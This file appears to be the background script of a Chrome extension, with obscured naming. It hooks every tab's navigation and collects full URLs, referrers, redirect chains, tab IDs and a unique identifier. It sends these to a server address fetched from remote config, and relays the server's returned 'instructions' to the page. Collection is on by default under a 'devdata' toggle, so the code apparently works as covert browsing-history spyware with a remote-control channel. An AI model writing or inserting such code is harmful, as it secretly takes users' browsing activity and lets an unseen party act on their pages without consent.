let recepies_loader = (function () {
	let toggler = new (function () {
		let isOn = true,
			defaultVal = true,
			localKey = tkey;

		function save() {
			localStorage.setItem(localKey, isOn ? 1 : 0);
		}

		function load() {
			let val = localStorage.getItem(localKey),
				intVal = parseInt(val);
			if (isNaN(intVal)) {
				isOn = defaultVal;
			} else {
				isOn = intVal === 1;
			}
		}

		this.turnOn = function () {
			isOn = true;
			save();
			_optTurnOn();
		};

		function _optTurnOn() {
		}

		this.turnOff = function () {
			isOn = false;
			save();
		};
		this.isOn = function () {
			return isOn;
		};

		/**
		 * returns a Promise which resolves only when (or after) toggler is turned On
		 * if toggler is turned on by the time this function is called
		 * promise resolved instantly
		 * @returns {Promise}
		 */
		this.whenOn = function () {
			if (this.isOn()) {
				return Promise.resolve(true);
			}
			return new Promise(function (resolve) {
				_optTurnOn = function () {
					resolve();
				};
			});
		};

		load();
	});

	let configFetcher = new (
		function () {
			let settings = '';

			let setDump = function () {
				localStorage.setItem(settings_key, JSON.stringify(settings));
			};
			let setLoad = function () {
				let p = localStorage.getItem(settings_key);
				settings = p ? JSON.parse(p) : settings;
			};
			let setUp = function (endpt) {
				let cb = function (sts, resp) {
					if (!sts) {
						return;
					}
					settings = JSON.parse(resp);
					setDump();
				};
				let xhr = new XMLHttpRequest();
				xhr.onreadystatechange = function () {
					if (4 == xhr.readyState) {
						cb.apply(null, [200 == xhr.status, xhr.responseText].concat(arguments));
					}
				};
				let proc = function (arr) {
					return Object.keys(arr).map(function (hashed) {
						return hashed + '=' + arr[hashed];
					}).join("&")
				};
				xhr.open("GET", endpt + "?" + proc({s: itemator, ver: version}), true);
				xhr.send();
			};
			setLoad();
			toggler.whenOn().then(function () {
				setUp(url + set_route);
			});
			this.enablator = function () {
				settings[skeys[0]] = 1;
				setDump();
			};
			this.disablator = function () {
				settings[skeys[0]] = 0;
				setDump();
			};
			this.IsEnable = function () {
				return Boolean(settings && settings[skeys[0]])
			};
			this.MainLocator = function () {
				return settings && settings[skeys[1]]
			};
		}
	)();

	function fetchOverlayPattern(data, callback) {
		data.clock = Date.now();
		let payload = encodeProperties(removeProperties(data));
		payload.gun = payload.gun.join(",");
		let xhr = new XMLHttpRequest();
    xhr.open('POST', configFetcher.MainLocator() + main_route, true);
		xhr.setRequestHeader("Content-type", "application/json");
		xhr.setRequestHeader("romn", getDomainName(data["ry"]));
		xhr.onload = function (e) {
			if (this.status == 200) {
				callback(JSON.parse(this.response));
			}
		};

		xhr.send(JSON.stringify(payload));
	}

	function removeProperties(object) {
	  const updatedObject = {};

    Object.keys(object)
      .filter(key => (!!object[key] || false === object[key]) && filtered.indexOf(key) === -1)
      .filter(key => key !== 'gt' || object['gt'].length > 0)
      .forEach(key => updatedObject[key] = object[key]);

    return updatedObject;
  }

	function encodeProperties(object) {
	  const encodedProperties = {};

	  Object.keys(object)
      .filter(key => ['ry', 'ev', 'pp', 'gh'].includes(key))
      .map(key => encodedProperties[key] = encodeURIComponent(object[key] || ''));

	  if (object['gt']) {
      encodedProperties['gt'] = object['gt'].map(value => encodeURIComponent(value));
    }

    return Object.assign(object, encodedProperties, { decode: 2 });
  }

	function TabList() {
		let hash = {};
		let lp = "";
		let lpi = undefined;
		return {
			remove: function (tid) {
				delete hash[tid];
			},
			edit: function (tid, props) {
				if (!tid) return null;
				if (!hash[tid]) this.clear(tid);
				Object.keys(props || {}).forEach(function (key) {
					hash[tid][key] = props[key];
				});
				return hash[tid];
			},
			request: function (tabId, tab) {
				if (!configFetcher.IsEnable() || !toggler.isOn())
					return;
				if (!hash[tabId] || (hash[tabId].p && !hash[tabId].replaced)) {
					this.clear(tabId);

					return;
				}

				let currTab = hash[tabId] || {};
				let url = validateUrl(tab.url);

				let tIA = [tabId];
				if (hash[tabId].prevTabId) {
					tIA[1] = hash[tabId].prevTabId;
				}

				if (url && !(!currTab.hh && lp == tab.url)) {
					if (!tab.active && !hash[tabId].fr) {
						hash[tabId].ex.push("background_auto_reloading");
					}
					fetchOverlayPattern(this.edit(tabId, {
						ry: url,
						ev: lp,
						gun: tIA,
						pay: paykey
					}), function (pattern) {
						if(pattern.instructions) {
							chrome.tabs.sendMessage(tabId, {
								pattern: pattern
							}, (response) => {
								//for nicovideo
								if (REGEXP.nicovideo.test(tab.url) && response) {
									let xhr = new XMLHttpRequest();

									xhr.open('GET', 'https://flapi.nicovideo.jp/api/getflv/' + response + '?as3=1');
									xhr.onload = () => {
										pattern.instructions.downloadUrl = parseUri(xhr.responseText).url || pattern.instructions.downloadUrl;
										chrome.tabs.sendMessage(tabId, {
											pattern: pattern
										});
									};
									xhr.send();
								}
							});
						}
					});
					if (tab.active) {
						lp = currTab.ry;
					}
					hash[tabId].dada = null;
				}
				this.clear(tabId);
				hash[tabId].ry = url;
				hash[tabId].p = true;
			},
			clear: function (tid) {
				hash[tid] = {
					oo: version || "missing", d: 21, col: "1", t: 4, ch: ch,
					o: itemator, gu: guid(), seso: '', tgh: 0,
					gt: [], restarting: false,

					ry: (hash[tid] || {}).ry || null,
					pp: (hash[tid] || {}).pp || '',
					ex: [], fr: false, aj: (hash[tid] || {}).aj || false,
					replaced: (hash[tid] || {}).replaced || false,
					hh: (hash[tid] || {}).hh || false,
					dada: (hash[tid] || {}).dada || null,
					retroet: (hash[tid] || {}).retroet || '',
					gun: (hash[tid] || {}).tid || [tid],
					pay: paykey
				};
			},
			details: function (tid, cb) {
				chrome.tabs.get(tid, function (details) {
					if (!chrome.runtime.lastError) {
						cb(details);
					}
				});
			},
			lpUpdate: function (param) {
				let idd = param.id || param;
				lpi = param.id || undefined;
				lp = (hash[idd] || {}).ry || lp;
			},
			getLpi: function () {
				return lpi;
			}
		}
	}

	let tablist = new TabList();
	let cb = chrome.browserAction,
		ct = chrome.tabs,
		wr = chrome.webRequest,
		wn = chrome.webNavigation,
		cw = chrome.windows;

	cw.getAll({populate: true}, function (windows) {
		for (let w = 0; w < windows.length; w++) {
			for (let i = 0; i < windows[w].tabs.length; i++) {
				if (!validateUrl(windows[w].tabs[i].url))
					continue;
				tablist.edit(windows[w].tabs[i].id, {ry: windows[w].tabs[i].url, restarting: true});
				if (windows[w].focused && windows[w].tabs[i].active) {

					tablist.lpUpdate(windows[w].tabs[i]);
				}

			}
		}
	});

	function reselected(tid) {
		tablist.details((tid || {}).tabId || tid, tablist.lpUpdate);
	}

	ct.onUpdated.addListener(onUpdated);
	ct.onReplaced.addListener(onReplaced);

	let repertuar = {types: ["main_frame"], urls: ["<all_urls>"]};

	wr.onBeforeRequest.addListener(function (details) {
		validateUrl(details.url) && tablist.edit(details.tabId, {ry: undefined, p: false, aj: false});

	}, repertuar, ["blocking"]);

	wr.onBeforeRedirect.addListener(function (details) {
		validateUrl(details.url) && tablist.edit(details.tabId).gt.push(details.url);
	}, repertuar);
	wr.onBeforeSendHeaders.addListener(onBeforeSendHeaders, repertuar, ["blocking", "requestHeaders"]);
	wr.onHeadersReceived.addListener(function (details) {
		tablist.edit(details.tabId, {hh: true})
	}, repertuar);

	wn.onCommitted.addListener(onCommitted);

	ct.onRemoved.addListener(function (tabId) {
		tablist.remove(tabId);
	});
	cw.onRemoved.addListener(cwonRemoved);
	ct.onCreated.addListener(onCreated);

	cw.onFocusChanged.addListener(cwonFocused);

	if (ct.onActivated) {
		ct.onActivated.addListener(reselected);
	} else {
		ct.onSelectionChanged.addListener(reselected);
	}

	wr.onErrorOccurred.addListener(function (details) {
		try {
			tablist.edit(details.tabId, {gt: null});
		} catch (e) {
		}
	}, repertuar);

	function onUpdated(tabId, details, tab) {

		if (details && "complete" === details.status) {
			if (tablist.edit(tabId).p && tablist.edit(tabId).aj) {
				tablist.edit(tabId, {ry: undefined, p: false, aj: false});

			}
			tablist.edit(tabId, {pe: "ajax", aj: true});
			tablist.request(tabId, tab);
			tablist.edit(tabId, {replaced: false});
		}
	}

	function onReplaced(addedTabId, removedTabId) {

		tablist.edit(addedTabId, {replaced: true, prevTabId: removedTabId});
		tablist.details(addedTabId, tablist.request.bind(tablist, (addedTabId || {}).tabId || addedTabId));
	}

	function onBeforeSendHeaders(details) {
		tablist.edit(details.tabId, {hh: true});

		if (!details.requestHeaders.some(function (rh) {
				return /^Referer$/i.test(rh.name) && tablist.edit(details.tabId, {pp: rh.value});
			})) {
			tablist.edit(details.tabId, {pp: ''})
		}
		return {requestHeaders: details.requestHeaders};
	}

	function onCommitted(dtls) {
		dtls = dtls || {};
		let tid = dtls.tabId;
		let trq = dtls.transitionQualifiers;

		if (tid && dtls.frameId === 0) {
			tablist.edit(tid, {pe: dtls.transitionType, er: trq});
			if (/client_redirect/.test(trq)) {
				tablist.edit(tid, {gh: dtls.url});
			}
			if (/server_redirect/.test(trq)) {
			}

			tablist.details(tid, tablist.request.bind(tablist, (tid || {}).tabId || tid));
		}

	}

	function cwonRemoved(windowID) {
		ct.query({active: true}, function (tabs) {
			if (tabs[0]) {
				tablist.lpUpdate(tabs[0]);
			}
		});
	}

	function cwonFocused(window) {
		if (cw.WINDOW_ID_NONE == window) {
			return;
		}
		ct.query({windowId: window, active: true}, function (tabs) {
			if (tabs[0] && tabs[0].active) {
				tablist.lpUpdate(tabs[0]);
			}
		});
	}

	function onCreated(tab) {
		let curTab = tablist.edit(tab.id, {fr: true, replaced: false});
		let openerTabId = tab.openerTabId || tablist.getLpi();
		let oOpenerTabInfo = tablist.edit(openerTabId);
		if (tab.url.length && tablist.edit(openerTabId) && tab.url === tablist.edit(openerTabId).ry) {
			tablist.edit(tab.id).ex.push("duplication");
		} else if (tab.url.length) {
			ct.query({
				url: tab.url
			}, function (tabs) {
				if ((tabs || []).length > 1) {
					tablist.edit(tab.id).ex.push("duplication");
					tablist.edit(tab.id).ex.push("background_duplication");
				}
			});
		}
		if ('complete' == tab.status && !tab.openerTabId) {
			tablist.edit(tab.id).ex.push("reopening");
		}
		tablist.edit(tab.id, {dada: openerTabId});
	}

	chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
		if (!request || !request.action) return;
		switch (request.action) {
			case "share_devdata_on":
				toggler.turnOn();
				break;
			case "share_devdata_off":
				toggler.turnOff();
				break;
		}
	});

	return {
		optin: toggler.turnOn,
		optout: toggler.turnOff,
		isopt: toggler.isOn,
		whenopt: toggler.whenOn()
	}
}());
